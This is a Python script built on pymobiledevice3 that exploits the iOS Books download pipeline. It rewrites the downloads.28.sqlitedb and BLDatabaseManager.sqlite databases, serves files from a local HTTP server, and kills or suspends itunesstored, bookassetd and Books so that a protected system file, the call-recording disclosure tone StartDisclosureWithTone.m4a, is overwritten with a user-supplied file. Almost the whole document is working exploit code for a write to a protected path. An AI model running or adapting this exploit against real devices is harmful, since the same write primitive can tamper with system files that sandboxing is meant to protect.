import platform
import sys
import traceback
import subprocess
import atexit
import concurrent
import os
import posixpath
import queue
import socket
import sqlite3
import shutil
import time
import threading
import functools
from pathlib import Path
from threading import Timer
from http.server import HTTPServer, SimpleHTTPRequestHandler

import asyncio
import click
import requests
from packaging.version import parse as parse_version
from pymobiledevice3.cli.cli_common import Command
from pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception, DeviceNotFoundError
from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.lockdown_service_provider import LockdownServiceProvider
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.os_trace import OsTraceService
from pymobiledevice3.services.dvt.dvt_secure_socket_proxy import DvtSecureSocketProxyService
from pymobiledevice3.tunneld.api import async_get_tunneld_devices
from pymobiledevice3.services.os_trace import OsTraceService
from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
from pymobiledevice3.services.dvt.instruments.process_control import ProcessControl

START_DISCLOSURE_PATH = "/var/mobile/Library/CallServices/Greetings/default/StartDisclosureWithTone.m4a"
GLOBAL_TIMEOUT_SECONDS = 50


def get_uuid_from_tracev2_after_reboot(service_provider: LockdownClient):
    """Get UUID from tracev2 logs after device has been rebooted"""
    click.secho("Monitoring tracev2 logs for bookassetd container UUID...", fg="yellow")
    try:
        for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
            if posixpath.basename(syslog_entry.filename) == 'bookassetd':
                message = syslog_entry.message
                if "/var/containers/Shared/SystemGroup/" in message:
                    try:
                        uuid = message.split("/var/containers/Shared/SystemGroup/")[1].split("/")[0]
                        if len(uuid) >= 10:
                            click.secho(f"Found bookassetd container UUID: {uuid}", fg="green")
                            with open("uuid.txt", "w") as f:
                                f.write(uuid)
                            return uuid
                    except (IndexError, AttributeError):
                        continue
                if "/Documents/BLDownloads/" in message:
                    try:
                        uuid = message.split("/var/containers/Shared/SystemGroup/")[1] \
                            .split("/Documents/BLDownloads")[0]
                        if len(uuid) >= 10:
                            click.secho(f"Found bookassetd container UUID: {uuid}", fg="green")
                            with open("uuid.txt", "w") as f:
                                f.write(uuid)
                            return uuid
                    except (IndexError, AttributeError):
                        continue
    except Exception as e:
        click.secho(f"Error reading tracev2 logs: {e}", fg="red")
        return None

    click.secho("Could not find UUID in tracev2 logs", fg="red")
    return None


def reboot_and_get_uuid(service_provider: LockdownClient, udid: str):
    """Reboot device and get UUID from tracev2 logs automatically"""
    uuid = open("uuid.txt", "r").read().strip() if Path("uuid.txt").exists() else ""
    if len(uuid) >= 10:
        click.secho(f"Using saved bookassetd container UUID: {uuid}", fg="green")
        return uuid, service_provider

    click.secho("UUID not found. Rebooting device to get UUID from tracev2...", fg="yellow")

    try:
        diagnostics = DiagnosticsService(lockdown=service_provider)
        click.secho("Rebooting device...", fg="yellow")
        diagnostics.restart()
        click.secho("Device is rebooting. Waiting for device to reconnect...", fg="yellow")
    except Exception as e:
        click.secho(f"Error rebooting device: {e}", fg="red")
        return None, None

    max_wait_time = 120
    wait_interval = 2
    elapsed_time = 0

    while elapsed_time < max_wait_time:
        time.sleep(wait_interval)
        elapsed_time += wait_interval
        try:
            new_service_provider = create_using_usbmux(serial=udid)
            click.secho("Device reconnected.", fg="green")
            click.secho("Please unlock the device if necessary.", fg="yellow")
            input("Press Enter once the device is unlocked and at the home screen...")
            click.secho("Getting UUID from tracev2...", fg="green")
            uuid = get_uuid_from_tracev2_after_reboot(new_service_provider)
            if uuid:
                return uuid, new_service_provider
            else:
                return None, new_service_provider
        except Exception:
            if elapsed_time % 10 == 0:
                click.secho(f"Waiting for device to reconnect... ({elapsed_time}s)", fg="yellow")
            continue
    else:
        click.secho("Timeout waiting for device to reconnect", fg="red")
        return None, None


def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def start_http_server():
    handler = functools.partial(SimpleHTTPRequestHandler)
    httpd = HTTPServer(("0.0.0.0", 0), handler)
    info_queue.put((get_lan_ip(), httpd.server_port))
    httpd.serve_forever()

def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxyService, uuid: str = None):
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()
    ip, port = info_queue.get()
    print(f"Hosting temporary http server on: http://{ip}:{port}/")

    start_disclosure_url = f"http://{ip}:{port}/StartDisclosureWithTone.m4a"
    with sqlite3.connect("BLDatabaseManager.sqlite") as bldb_conn:
        bldb_cursor = bldb_conn.cursor()
        bldb_cursor.execute("""
        UPDATE ZBLDOWNLOADINFO
        SET ZASSETPATH = ?, ZPLISTPATH = ?, ZDOWNLOADID = ?
        """, (START_DISCLOSURE_PATH, START_DISCLOSURE_PATH, START_DISCLOSURE_PATH))
        bldb_cursor.execute("""
        UPDATE ZBLDOWNLOADINFO
        SET ZURL = ?
        """, (start_disclosure_url,))
        bldb_conn.commit()
    click.secho(f"Updated BLDatabaseManager.sqlite download URL to {start_disclosure_url}", fg="blue")

    afc = AfcService(lockdown=service_provider)
    pc = ProcessControl(dvt)
    
    if not uuid or len(uuid) < 10:
        uuid = open("uuid.txt", "r").read().strip() if Path("uuid.txt").exists() else ""
    if len(uuid) < 10:
        try:
            pc.launch("com.apple.iBooks")
        except Exception as e:
            click.secho(f"Error launching Books app: {e}", fg="red")
            return
        click.secho("Finding bookassetd container UUID...", fg="yellow")
        click.secho("Please open Books app and download a book to continue.", fg="yellow")
        for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
            if (posixpath.basename(syslog_entry.filename) != 'bookassetd') or \
                    not "/Documents/BLDownloads/" in syslog_entry.message:
                continue
            uuid = syslog_entry.message.split("/var/containers/Shared/SystemGroup/")[1] \
                    .split("/Documents/BLDownloads")[0]
            click.secho(f"Found bookassetd container UUID: {uuid}", fg="yellow")
            with open("uuid.txt", "w") as f:
                f.write(uuid)
            break
    else:
        click.secho(f"Using bookassetd container UUID: {uuid}", fg="green")
    
    # Modify downloads.28.sqlitedb
    # Copy downloads.28.sqlitedb to tmp.downloads.28.sqlitedb
    shutil.copyfile("downloads.28.sqlitedb", "tmp.downloads.28.sqlitedb")
    conn = sqlite3.connect("tmp.downloads.28.sqlitedb")
    cursor = conn.cursor()
    bldb_local_prefix = f"/private/var/containers/Shared/SystemGroup/{uuid}/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
    cursor.execute(f"""
    UPDATE asset
    SET local_path = CASE
        WHEN local_path LIKE '%/BLDatabaseManager.sqlite'
            THEN '{bldb_local_prefix}'
        WHEN local_path LIKE '%/BLDatabaseManager.sqlite-shm'
            THEN '{bldb_local_prefix}-shm'
        WHEN local_path LIKE '%/BLDatabaseManager.sqlite-wal'
            THEN '{bldb_local_prefix}-wal'
    END
    WHERE local_path LIKE '/private/var/containers/Shared/SystemGroup/%/Documents/BLDatabaseManager/BLDatabaseManager.sqlite%'
    """)
    bldb_server_prefix = f"http://{ip}:{port}/BLDatabaseManager.sqlite"
    cursor.execute(f"""
    UPDATE asset
    SET url = CASE
        WHEN url LIKE '%/BLDatabaseManager.sqlite'
            THEN '{bldb_server_prefix}'
        WHEN url LIKE '%/BLDatabaseManager.sqlite-shm'
            THEN '{bldb_server_prefix}-shm'
        WHEN url LIKE '%/BLDatabaseManager.sqlite-wal'
            THEN '{bldb_server_prefix}-wal'
    END
    WHERE url LIKE '%/BLDatabaseManager.sqlite%'
    """)
    conn.commit()
            
    # Kill bookassetd and Books processes to stop them from updating BLDatabaseManager.sqlite
    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    if pid_bookassetd:
        click.secho(f"Stopping bookassetd pid {pid_bookassetd}...", fg="yellow")
        pc.signal(pid_bookassetd, 19)
    if pid_books:
        click.secho(f"Killing Books pid {pid_books}...", fg="yellow")
        pc.kill(pid_books)
    
    # Upload StartDisclosureWithTone.m4a
    click.secho("Uploading StartDisclosureWithTone.m4a", fg="yellow")
    remote_file = "StartDisclosureWithTone.m4a"
    AfcService(lockdown=service_provider).push(sd_file, remote_file)
    
    # Upload downloads.28.sqlitedb
    click.secho("Uploading downloads.28.sqlitedb", fg="yellow")
    afc.push("tmp.downloads.28.sqlitedb", "Downloads/downloads.28.sqlitedb")
    afc.push("tmp.downloads.28.sqlitedb-shm", "Downloads/downloads.28.sqlitedb-shm")
    afc.push("tmp.downloads.28.sqlitedb-wal", "Downloads/downloads.28.sqlitedb-wal")
    conn.close()

    # Kill itunesstored to trigger BLDataBaseManager.sqlite overwrite
    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    pid_itunesstored = next((pid for pid, p in procs.items() if p['ProcessName'] == 'itunesstored'), None)
    if pid_itunesstored:
        click.secho(f"Killing itunesstored pid {pid_itunesstored}...", fg="yellow")
        pc.kill(pid_itunesstored)
    
    # Wait for itunesstored to finish download and raise an error
    click.secho("Waiting for itunesstored to finish download...", fg="yellow")
    for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
        if (posixpath.basename(syslog_entry.filename) == 'itunesstored') and \
            "Install complete for download: 6936249076851270152 result: Failed" in syslog_entry.message:
            break
    
    # Kill bookassetd and Books processes to trigger StartDisclosureWithTone.m4a replacement
    pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    if pid_bookassetd:
        click.secho(f"Killing bookassetd pid {pid_bookassetd}...", fg="yellow")
        pc.kill(pid_bookassetd)
    if pid_books:
        click.secho(f"Killing Books pid {pid_books}...", fg="yellow")
        pc.kill(pid_books)
    
    # Re-open Books app
    try:
        pc.launch("com.apple.iBooks")
    except Exception as e:
        click.secho(f"Error launching Books app: {e}", fg="red")
        return
    
    click.secho("If this takes more than a minute please try again.", fg="yellow")
    click.secho("Waiting for StartDisclosureWithTone replacement to complete...", fg="yellow")
    success_message = f"{START_DISCLOSURE_PATH}) [Install-Mgr]: Marking download as [finished]"
    for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
        if (posixpath.basename(syslog_entry.filename) == 'bookassetd') and \
                success_message in syslog_entry.message:
            break
    pc.kill(pid_bookassetd)
    
    click.secho("Respringing", fg="green")
    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
    pid = next((pid for pid, p in procs.items() if p['ProcessName'] == 'SpringBoard'), None)
    pc.kill(pid)
    
    click.secho("Done!", fg="green")
    
    sys.exit(0)

def _run_async_rsd_connection(address, port, uuid):
    async def async_connection():
        async with RemoteServiceDiscoveryService((address, port)) as rsd:
            loop = asyncio.get_running_loop()

            def run_blocking_callback():
                with DvtSecureSocketProxyService(rsd) as dvt:
                    main_callback(rsd, dvt, uuid)

            await loop.run_in_executor(None, run_blocking_callback)

    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            with concurrent.futures.ThreadPoolExecutor() as executor:
                future = executor.submit(asyncio.run, async_connection())
                future.result()
        else:
            loop.run_until_complete(async_connection())
    except RuntimeError:
        asyncio.run(async_connection())

def exit_func(tunnel_proc):
    tunnel_proc.terminate()

async def create_tunnel(udid):
    # TODO: check for Windows
    tunnel_process = subprocess.Popen(f"sudo pymobiledevice3 lockdown start-tunnel --script-mode --udid {udid}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    atexit.register(exit_func, tunnel_process)
    while True:
        output = tunnel_process.stdout.readline()
        if output:
            rsd_val = output.decode().strip()
            break
        if tunnel_process.poll() is not None:
            error = tunnel_process.stderr.readlines()
            if error:
                not_connected = None
                admin_error = None
                for i in range(len(error)):
                    if (error[i].find(b'connected') > -1):
                        not_connected = True
                    if (error[i].find(b'admin') > -1):
                        admin_error = True
                if not_connected:
                    print("It seems like your device isn't connected.", error)
                elif admin_error:
                    print("It seems like you're not running this script as admin, which is required.", error)
                else:
                    print("Error opening a tunnel.", error)
                sys.exit()
            break
    rsd_str = str(rsd_val)
    print("Sucessfully created tunnel: " + rsd_str)
    return {"address": rsd_str.split(" ")[0], "port": int(rsd_str.split(" ")[1])}

async def connection_context(udid):# Create a LockdownClient instance
    try:
        service_provider = create_using_usbmux(serial=udid)
        marketing_name = service_provider.get_value(key="MarketingName")
        marketing_name = service_provider.get_value(key="MarketingName")
        device_build = service_provider.get_value(key="BuildVersion")
        device_product_type = service_provider.get_value(key="ProductType")
        device_version = parse_version(service_provider.product_version)
        click.secho(f"Got device: {marketing_name} (iOS {device_version}, Build {device_build})", fg="blue")
        click.secho("Please keep your device unlocked during the process.", fg="blue")
        
        # Validate StartDisclosureWithTone.m4a file presence
        if not Path(sd_file).is_file():
            click.secho("Error: StartDisclosureWithTone.m4a file not found", fg="red")
            return
        
        uuid, service_provider = reboot_and_get_uuid(service_provider, udid)
        if not service_provider:
            click.secho("Error: Could not reconnect to device after reboot", fg="red")
            return
        if not uuid:
            click.secho("Warning: Could not get UUID from tracev2. Will try fallback method in main_callback.", fg="yellow")

        if device_version >= parse_version('17.0'):
            available_address = await create_tunnel(udid)
            if available_address:
                _run_async_rsd_connection(available_address["address"], available_address["port"], uuid)
            else:
                raise Exception("An error occurred getting tunnels addresses...")
        else:
            # Use USB Mux
            with DvtSecureSocketProxyService(lockdown=service_provider) as dvt:
                main_callback(service_provider, dvt, uuid)
    except OSError:  # no route to host (Intel fix)
        pass
    except DeviceNotFoundError:
        click.secho("Device not found. Make sure it's unlocked.", fg="red")
    except Exception as e:
        raise Exception(f"Connection not established... {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python run.py <udid> /path/to/StartDisclosureWithTone.m4a")
        exit(1)
    
    sd_file = sys.argv[2]
    info_queue = queue.Queue()
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    def _timeout_handler():
        click.secho(f"Process timed out after {GLOBAL_TIMEOUT_SECONDS}s. Exiting.", fg="red")
        os._exit(1)
    timeout_timer = Timer(GLOBAL_TIMEOUT_SECONDS, _timeout_handler)
    timeout_timer.daemon = True
    timeout_timer.start()
    try:
        asyncio.run(connection_context(sys.argv[1]))
    finally:
        timeout_timer.cancel()
